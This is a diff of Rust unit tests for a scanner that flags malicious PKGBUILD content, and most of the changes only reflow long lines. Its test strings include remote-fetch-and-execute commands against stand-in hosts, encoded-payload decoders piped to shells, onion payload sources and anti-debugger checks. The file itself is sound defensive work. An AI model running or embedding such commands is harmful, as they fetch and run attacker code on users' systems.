@@ -1374,9 +1613,15 @@ mod scanner_tests {
 
     #[test]
     fn curl_pipe_sh_detected() {
-        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
-        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
-        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
+        assert!(is_curl_pipe_shell(
+            "curl -sSL https://evil.example.com/x | sh"
+        ));
+        assert!(is_curl_pipe_shell(
+            "wget -qO- http://evil.example.com/x | bash"
+        ));
+        assert!(!is_curl_pipe_shell(
+            "curl -sSL https://example.com/x -o file.tar.gz"
+        ));
         assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
     }
 
@@ -1385,12 +1630,16 @@ mod scanner_tests {
     #[test]
     fn base64_pipe_shell_detected() {
         assert!(is_base64_pipe_shell("base64 -d payload.b64 | sh"));
-        assert!(is_base64_pipe_shell("echo \"$PAYLOAD\" | base64 --decode | bash"));
+        assert!(is_base64_pipe_shell(
+            "echo \"$PAYLOAD\" | base64 --decode | bash"
+        ));
         assert!(is_base64_pipe_shell("base64 -d payload.b64 | env bash"));
         // decoding alone (no shell on the receiving end) already gets
         // flagged by is_base64_decode above -- this check specifically
         // wants the pipe-into-shell case
-        assert!(!is_base64_pipe_shell("base64 -d payload.b64 -o payload.bin"));
+        assert!(!is_base64_pipe_shell(
+            "base64 -d payload.b64 -o payload.bin"
+        ));
         assert!(!is_base64_pipe_shell("base64 -d payload.b64 | tee out.bin"));
         assert!(!is_base64_pipe_shell("# base64 -d payload.b64 | sh"));
     }
@@ -1409,12 +1658,20 @@ mod scanner_tests {
 
     #[test]
     fn source_process_subst_detected() {
-        assert!(is_source_process_subst("source <(curl -sSL https://evil.example.com/x)"));
-        assert!(is_source_process_subst(". <(wget -qO- http://evil.example.com/x)"));
+        assert!(is_source_process_subst(
+            "source <(curl -sSL https://evil.example.com/x)"
+        ));
+        assert!(is_source_process_subst(
+            ". <(wget -qO- http://evil.example.com/x)"
+        ));
         // process substitution not fed to source/. shouldn't flag
-        assert!(!is_source_process_subst("diff <(curl -sSL https://evil.example.com/x) file.txt"));
+        assert!(!is_source_process_subst(
+            "diff <(curl -sSL https://evil.example.com/x) file.txt"
+        ));
         assert!(!is_source_process_subst("source ./helpers.sh"));
-        assert!(!is_source_process_subst("# source <(curl https://evil.example.com/x)"));
+        assert!(!is_source_process_subst(
+            "# source <(curl https://evil.example.com/x)"
+        ));
     }
 
     #[test]
@@ -1428,8 +1685,12 @@ build() {
 }
 "#;
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings.iter().any(|f| f.message.contains("base64/hex-encoded blob")));
-        assert!(findings.iter().any(|f| f.message.contains("process substitution")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("base64/hex-encoded blob")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("process substitution")));
     }
 
     #[test]
@@ -1448,9 +1709,13 @@ build() {
 
     #[test]
     fn raw_ipv4_detected() {
-        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
+        assert!(contains_raw_ipv4(
+            "source=(\"http://185.220.101.5/payload.sh\")"
+        ));
         assert!(contains_raw_ipv4("192.168.1.1"));
-        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
+        assert!(!contains_raw_ipv4(
+            "source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"
+        ));
         assert!(!contains_raw_ipv4("no ip here at all"));
         // Known false positive, documented on contains_raw_ipv4: a 4-part
         // dotted version where every part is <= 255 reads as an IP too.
@@ -1485,27 +1750,42 @@ package() {
         // build() or the sandbox are anywhere in the picture.
         let pkgbuild = "pkgname=aura-emerge\npkgver=2.1.4\npkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgrel=1\n";
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings.iter().any(|f| f.message.contains("command substitution")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("command substitution")));
 
         // same construct inside a function body (only runs when makepkg
         // actually calls that function) must NOT flag.
-        let pkgver_func = "pkgname=foo\npkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n";
+        let pkgver_func =
+            "pkgname=foo\npkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n";
         assert!(scan_pkgbuild_source(pkgver_func).is_empty());
     }
 
     #[test]
     fn sandbox_evasion_detected() {
         assert!(has_sandbox_evasion("grep TracerPid /proc/self/status"));
-        assert!(has_sandbox_evasion("cat /proc/self/status | grep -i tracer"));
-        assert!(has_sandbox_evasion(r#"if [ -n "$LD_PRELOAD" ]; then exit 0; fi"#));
+        assert!(has_sandbox_evasion(
+            "cat /proc/self/status | grep -i tracer"
+        ));
+        assert!(has_sandbox_evasion(
+            r#"if [ -n "$LD_PRELOAD" ]; then exit 0; fi"#
+        ));
         assert!(has_sandbox_evasion("env | grep -i ld_library_path"));
-        assert!(has_sandbox_evasion(r#"if printenv LD_PRELOAD >/dev/null; then quit; fi"#));
+        assert!(has_sandbox_evasion(
+            r#"if printenv LD_PRELOAD >/dev/null; then quit; fi"#
+        ));
         // Commented out - must not flag.
-        assert!(!has_sandbox_evasion("# check TracerPid in /proc/self/status"));
+        assert!(!has_sandbox_evasion(
+            "# check TracerPid in /proc/self/status"
+        ));
         // Legitimate: setting the var for the build's own linking, not
         // reading it back to branch on - must not flag.
-        assert!(!has_sandbox_evasion(r#"export LD_LIBRARY_PATH="$srcdir/lib:$LD_LIBRARY_PATH""#));
-        assert!(!has_sandbox_evasion(r#"export LD_PRELOAD="$srcdir/libfakeasan.so""#));
+        assert!(!has_sandbox_evasion(
+            r#"export LD_LIBRARY_PATH="$srcdir/lib:$LD_LIBRARY_PATH""#
+        ));
+        assert!(!has_sandbox_evasion(
+            r#"export LD_PRELOAD="$srcdir/libfakeasan.so""#
+        ));
         // Unrelated use of "env" - must not flag.
         assert!(!has_sandbox_evasion("env FOO=bar ./configure"));
     }
@@ -1514,13 +1794,18 @@ package() {
     fn sandbox_evasion_flagged_in_full_scan() {
         let src = "pkgname=foo\nbuild() {\n  if grep -q TracerPid /proc/self/status; then\n    return 0\n  fi\n  do_real_payload\n}\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings.iter().any(|f| f.message.contains("TracerPid") || f.message.contains("anti-debugger")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("TracerPid") || f.message.contains("anti-debugger")));
     }
 
     #[test]
     fn validpgpkeys_single_line() {
         let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
-        assert_eq!(parse_validpgpkeys(src), vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]);
+        assert_eq!(
+            parse_validpgpkeys(src),
+            vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]
+        );
     }
 
     #[test]
@@ -1550,32 +1835,52 @@ package() {
             contains_known_malicious_package("bun install js-digest"),
             Some("js-digest")
         );
-        assert_eq!(contains_known_malicious_package("npm install typescript"), None);
+        assert_eq!(
+            contains_known_malicious_package("npm install typescript"),
+            None
+        );
     }
 
     #[test]
     fn decoy_tool_binary_detected() {
         // Real August-2026-wave shape: install a bundled ELF under a
         // generic build-tool name.
-        assert!(has_decoy_tool_binary(r#"install -Dm755 "$srcdir/linter" "$pkgdir/usr/bin/linter""#));
-        assert!(has_decoy_tool_binary(r#"install -Dm755 hasher "$pkgdir/usr/bin/hasher""#));
-        assert!(has_decoy_tool_binary("chmod +x \"$pkgdir/usr/bin/validator\""));
+        assert!(has_decoy_tool_binary(
+            r#"install -Dm755 "$srcdir/linter" "$pkgdir/usr/bin/linter""#
+        ));
+        assert!(has_decoy_tool_binary(
+            r#"install -Dm755 hasher "$pkgdir/usr/bin/hasher""#
+        ));
+        assert!(has_decoy_tool_binary(
+            "chmod +x \"$pkgdir/usr/bin/validator\""
+        ));
         assert!(has_decoy_tool_binary("chmod 755 $pkgdir/usr/bin/optimizer"));
         // Commented out - must not flag.
-        assert!(!has_decoy_tool_binary("# install -Dm755 validator /usr/bin/validator"));
+        assert!(!has_decoy_tool_binary(
+            "# install -Dm755 validator /usr/bin/validator"
+        ));
         // Unrelated install (docs, not an executable under a decoy name).
-        assert!(!has_decoy_tool_binary(r#"install -Dm644 "$pkgdir/usr/share/doc/README""#));
+        assert!(!has_decoy_tool_binary(
+            r#"install -Dm644 "$pkgdir/usr/share/doc/README""#
+        ));
         // Substring of the decoy name, not the name itself - must not flag.
-        assert!(!has_decoy_tool_binary(r#"install -Dm755 validators.conf "$pkgdir/etc/validators.conf""#));
+        assert!(!has_decoy_tool_binary(
+            r#"install -Dm755 validators.conf "$pkgdir/etc/validators.conf""#
+        ));
         // A legitimate binary install under an unrelated name - must not flag.
-        assert!(!has_decoy_tool_binary(r#"install -Dm755 "$srcdir/aura-emerge" "$pkgdir/usr/bin/aura-emerge""#));
+        assert!(!has_decoy_tool_binary(
+            r#"install -Dm755 "$srcdir/aura-emerge" "$pkgdir/usr/bin/aura-emerge""#
+        ));
     }
 
     #[test]
     fn decoy_tool_binary_flagged_in_full_scan() {
-        let src = "build() {\n  install -Dm755 \"$srcdir/minifier\" \"$pkgdir/usr/bin/minifier\"\n}\n";
+        let src =
+            "build() {\n  install -Dm755 \"$srcdir/minifier\" \"$pkgdir/usr/bin/minifier\"\n}\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings.iter().any(|f| f.message.contains("generic build-tool name")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("generic build-tool name")));
     }
 
     #[test]
@@ -1583,7 +1888,7 @@ package() {
         assert!(is_known_compromised_package("archutil"));
         assert!(is_known_compromised_package("openconnect-sso"));
         assert!(is_known_compromised_package("StorageExplorer-Bin")); // case-insensitive
-        // Not a substring match - a lookalike/unrelated name must not flag.
+                                                                      // Not a substring match - a lookalike/unrelated name must not flag.
         assert!(!is_known_compromised_package("archutil2"));
         assert!(!is_known_compromised_package("my-archutil-fork"));
         assert!(!is_known_compromised_package("firefox"));
@@ -1602,7 +1907,9 @@ package() {
 
     #[test]
     fn foreign_pkg_manager_install_detected() {
-        assert!(is_foreign_pkg_manager_install("npm install atomic-lockfile"));
+        assert!(is_foreign_pkg_manager_install(
+            "npm install atomic-lockfile"
+        ));
         assert!(is_foreign_pkg_manager_install("bun add js-digest"));
         assert!(is_foreign_pkg_manager_install("pip install requests"));
         // Local/project installs - no named external package - must NOT flag.
@@ -1610,19 +1917,33 @@ package() {
         assert!(!is_foreign_pkg_manager_install("npm ci"));
         assert!(!is_foreign_pkg_manager_install("npm install ."));
         assert!(!is_foreign_pkg_manager_install("npm install --production"));
-        assert!(!is_foreign_pkg_manager_install("yarn add ./vendor/local-pkg"));
+        assert!(!is_foreign_pkg_manager_install(
+            "yarn add ./vendor/local-pkg"
+        ));
         // Value-taking flags: the flag's argument isn't the package name.
-        assert!(!is_foreign_pkg_manager_install("npm install --cache \"$srcdir/npm-cache\""));
-        assert!(!is_foreign_pkg_manager_install("pip install -r requirements.txt"));
+        assert!(!is_foreign_pkg_manager_install(
+            "npm install --cache \"$srcdir/npm-cache\""
+        ));
+        assert!(!is_foreign_pkg_manager_install(
+            "pip install -r requirements.txt"
+        ));
         // A real named package after a value-taking flag must still be caught.
-        assert!(is_foreign_pkg_manager_install("npm install --registry https://registry.npmjs.org left-pad"));
+        assert!(is_foreign_pkg_manager_install(
+            "npm install --registry https://registry.npmjs.org left-pad"
+        ));
         assert!(is_foreign_pkg_manager_install("npm install -g typescript"));
         // Regression: a flag NOT in the verified value-taking list must
         // never eat the next token, or a real package name could hide
         // behind it (e.g. a boolean flag wrongly treated as value-taking).
-        assert!(is_foreign_pkg_manager_install("npm install --global-style evil-pkg"));
-        assert!(is_foreign_pkg_manager_install("npm install --save-exact evil-pkg"));
-        assert!(is_foreign_pkg_manager_install("pip install --user evil-pkg"));
+        assert!(is_foreign_pkg_manager_install(
+            "npm install --global-style evil-pkg"
+        ));
+        assert!(is_foreign_pkg_manager_install(
+            "npm install --save-exact evil-pkg"
+        ));
+        assert!(is_foreign_pkg_manager_install(
+            "pip install --user evil-pkg"
+        ));
     }
 
     #[test]
@@ -1651,7 +1972,9 @@ package() {
             Some("foo.install".to_string())
         );
         assert_eq!(
-            parse_install_filename("install=${pkgname}.install   # note: mentions ${pkgname} again"),
+            parse_install_filename(
+                "install=${pkgname}.install   # note: mentions ${pkgname} again"
+            ),
             Some("${pkgname}.install".to_string())
         );
         assert_eq!(
@@ -1669,9 +1992,18 @@ package() {
 
     #[test]
     fn simple_var_ignores_trailing_inline_comment() {
-        assert_eq!(simple_var("pkgname=foo   # the package name", "pkgname"), Some("foo".to_string()));
-        assert_eq!(simple_var("pkgdesc=\"a #1 package\"  # comment", "pkgdesc"), Some("a #1 package".to_string()));
-        assert_eq!(simple_var("pkgname=(a b)  # split package", "pkgname"), None);
+        assert_eq!(
+            simple_var("pkgname=foo   # the package name", "pkgname"),
+            Some("foo".to_string())
+        );
+        assert_eq!(
+            simple_var("pkgdesc=\"a #1 package\"  # comment", "pkgdesc"),
+            Some("a #1 package".to_string())
+        );
+        assert_eq!(
+            simple_var("pkgname=(a b)  # split package", "pkgname"),
+            None
+        );
     }
 
     #[test]
@@ -1686,7 +2018,9 @@ package() {
         assert!(!is_hex_escape_payload(
             "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
         ));
-        assert!(!is_hex_escape_payload("commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"));
+        assert!(!is_hex_escape_payload(
+            "commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"
+        ));
         // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
         assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
     }
@@ -1775,13 +2109,23 @@ post_install() {
 }
 "#;
         let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
-        assert!(pkgbuild_findings.is_empty(), "clean PKGBUILD should have no findings on its own");
+        assert!(
+            pkgbuild_findings.is_empty(),
+            "clean PKGBUILD should have no findings on its own"
+        );
 
-        assert_eq!(parse_install_filename(pkgbuild), Some("totally-legit-tool.install".to_string()));
+        assert_eq!(
+            parse_install_filename(pkgbuild),
+            Some("totally-legit-tool.install".to_string())
+        );
 
         let install_findings = scan_pkgbuild_source(install_hook);
-        assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
-        assert!(install_findings.iter().any(|f| f.severity == Severity::ConfirmedIoc));
+        assert!(install_findings
+            .iter()
+            .any(|f| f.message.contains("atomic-lockfile")));
+        assert!(install_findings
+            .iter()
+            .any(|f| f.severity == Severity::ConfirmedIoc));
     }
 
     #[test]
@@ -1799,8 +2143,12 @@ post_install() {
         let findings = scan_pkgbuild_source(src);
         // Hits both the exact-IOC check (AtomicArch) and the generic
         // foreign-package-manager heuristic (Suspicious) on the same line.
-        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
-        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
+        assert!(findings
+            .iter()
+            .any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
+        assert!(findings
+            .iter()
+            .any(|f| f.severity == Severity::Suspicious && f.line == 2));
     }
 
     #[test]
@@ -1828,20 +2176,32 @@ build() {
 
     #[test]
     fn paste_site_fetch_detected() {
-        assert!(is_paste_site_fetch("curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"));
+        assert!(is_paste_site_fetch(
+            "curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"
+        ));
         assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
         assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
-        assert!(!is_paste_site_fetch("curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"));
-        assert!(!is_paste_site_fetch("# curl https://pastebin.com/raw/AbCd1234 (just a comment)"));
+        assert!(!is_paste_site_fetch(
+            "curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"
+        ));
+        assert!(!is_paste_site_fetch(
+            "# curl https://pastebin.com/raw/AbCd1234 (just a comment)"
+        ));
         // Mentioning a paste site without an actual fetch verb shouldn't fire.
-        assert!(!is_paste_site_fetch("# see https://pastebin.com/raw/AbCd1234 for context"));
+        assert!(!is_paste_site_fetch(
+            "# see https://pastebin.com/raw/AbCd1234 for context"
+        ));
     }
 
     #[test]
     fn compromised_marker_detected() {
         assert!(has_compromised_marker("touch /compromised.txt"));
-        assert!(has_compromised_marker("echo pwned > \"$HOME/compromised.txt\""));
-        assert!(!has_compromised_marker("# compromised.txt was the 2018 marker file (comment only)"));
+        assert!(has_compromised_marker(
+            "echo pwned > \"$HOME/compromised.txt\""
+        ));
+        assert!(!has_compromised_marker(
+            "# compromised.txt was the 2018 marker file (comment only)"
+        ));
         assert!(!has_compromised_marker("this file is totally fine"));
     }
 
@@ -1860,10 +2220,18 @@ build() {
 }
 "#;
         let findings = scan_pkgbuild_source(src);
-        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc
-            && f.message.contains("compromised.txt")));
-        assert!(findings.iter().any(|f| f.message.contains("paste-dump site")));
-        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::ConfirmedIoc
+                    && f.message.contains("compromised.txt"))
+        );
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("paste-dump site")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("curl/wget | sh")));
     }
 
     // ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
@@ -1891,8 +2259,12 @@ build() {
             "source=(\"http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/stage2\")"
         ));
         assert!(is_onion_address("C2=abc123def456.onion"));
-        assert!(!is_onion_address("# see the project's .onion mirror in the wiki (comment only)"));
-        assert!(!is_onion_address("source=(\"https://github.com/foo/bar/archive/v1.tar.gz\")"));
+        assert!(!is_onion_address(
+            "# see the project's .onion mirror in the wiki (comment only)"
+        ));
+        assert!(!is_onion_address(
+            "source=(\"https://github.com/foo/bar/archive/v1.tar.gz\")"
+        ));
     }
 
     #[test]
@@ -1904,7 +2276,9 @@ build() {
             Some("e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77")
         );
         assert_eq!(
-            contains_known_malicious_hash("sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"),
+            contains_known_malicious_hash(
+                "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
+            ),
             None
         );
     }
@@ -1929,31 +2303,48 @@ build() {
 }
 "#;
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious
-            && f.message.contains("sudo/pkexec/doas")));
+        assert!(findings
+            .iter()
+            .any(|f| f.severity == Severity::Suspicious && f.message.contains("sudo/pkexec/doas")));
     }
 
     // ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────
 
     #[test]
     fn curl_pipe_absolute_path_shell_detected() {
-        assert!(is_curl_pipe_shell("wget -O- https://evil.example.com/x | /bin/sh"));
-        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | /usr/bin/bash"));
-        assert!(is_curl_pipe_shell("wget -qO- https://evil.example.com/x | env bash"));
-        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | env -S sh"));
+        assert!(is_curl_pipe_shell(
+            "wget -O- https://evil.example.com/x | /bin/sh"
+        ));
+        assert!(is_curl_pipe_shell(
+            "curl -sL https://evil.example.com/x | /usr/bin/bash"
+        ));
+        assert!(is_curl_pipe_shell(
+            "wget -qO- https://evil.example.com/x | env bash"
+        ));
+        assert!(is_curl_pipe_shell(
+            "curl -sL https://evil.example.com/x | env -S sh"
+        ));
         // still shouldn't false-positive on a plain download-to-file
-        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o /usr/bin/foo"));
+        assert!(!is_curl_pipe_shell(
+            "curl -sSL https://example.com/x -o /usr/bin/foo"
+        ));
     }
 
     // ── eval $(curl ...) ──────────────────────────────────────────────
 
     #[test]
     fn eval_remote_exec_detected() {
-        assert!(is_eval_remote_exec(r#"eval "$(curl -sSL https://evil.example.com/x)""#));
-        assert!(is_eval_remote_exec("eval `wget -qO- https://evil.example.com/x`"));
+        assert!(is_eval_remote_exec(
+            r#"eval "$(curl -sSL https://evil.example.com/x)""#
+        ));
+        assert!(is_eval_remote_exec(
+            "eval `wget -qO- https://evil.example.com/x`"
+        ));
         // bare eval on a local variable/array must not flag
         assert!(!is_eval_remote_exec("eval \"${some_array[@]}\""));
-        assert!(!is_eval_remote_exec("# eval \"$(curl https://evil.example.com/x)\" (comment)"));
+        assert!(!is_eval_remote_exec(
+            "# eval \"$(curl https://evil.example.com/x)\" (comment)"
+        ));
     }
 
     // ── python -c exec/eval + openssl decrypt ────────────────────────────
@@ -1971,10 +2362,16 @@ build() {
 
     #[test]
     fn openssl_decrypt_detected() {
-        assert!(is_openssl_decrypt("openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"));
-        assert!(is_openssl_decrypt("openssl aes-256-cbc -d -in blob -out out"));
+        assert!(is_openssl_decrypt(
+            "openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"
+        ));
+        assert!(is_openssl_decrypt(
+            "openssl aes-256-cbc -d -in blob -out out"
+        ));
         // encrypting (not decrypting) or unrelated openssl calls shouldn't flag
-        assert!(!is_openssl_decrypt("openssl enc -aes-256-cbc -in payload -out payload.enc"));
+        assert!(!is_openssl_decrypt(
+            "openssl enc -aes-256-cbc -in payload -out payload.enc"
+        ));
         assert!(!is_openssl_decrypt("openssl dgst -sha256 foo.tar.gz"));
     }
 
@@ -1983,22 +2380,34 @@ build() {
     #[test]
     fn resolve_install_filename_interpolated() {
         let src = "pkgname=foo\ninstall=${pkgname}.install\npkgver=1.0\n";
-        assert_eq!(resolve_install_filename(src), Some("foo.install".to_string()));
+        assert_eq!(
+            resolve_install_filename(src),
+            Some("foo.install".to_string())
+        );
 
         let src2 = "pkgname=bar\ninstall=$pkgname.install\npkgver=1.0\n";
-        assert_eq!(resolve_install_filename(src2), Some("bar.install".to_string()));
+        assert_eq!(
+            resolve_install_filename(src2),
+            Some("bar.install".to_string())
+        );
     }
 
     #[test]
     fn resolve_install_filename_literal_unchanged() {
         let src = "pkgname=foo\ninstall=custom-hook.install\n";
-        assert_eq!(resolve_install_filename(src), Some("custom-hook.install".to_string()));
+        assert_eq!(
+            resolve_install_filename(src),
+            Some("custom-hook.install".to_string())
+        );
     }
 
     #[test]
     fn resolve_install_filename_pkgbase_split_package() {
         let src = "pkgbase=mysuite\npkgname=(mysuite-a mysuite-b)\ninstall=${pkgbase}.install\n";
-        assert_eq!(resolve_install_filename(src), Some("mysuite.install".to_string()));
+        assert_eq!(
+            resolve_install_filename(src),
+            Some("mysuite.install".to_string())
+        );
     }
 
     #[test]
@@ -2042,6 +2451,8 @@ build() {
         // still catches it.
         let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
+        assert!(findings
+            .iter()
+            .any(|f| f.message.contains("curl/wget | sh")));
     }
 }
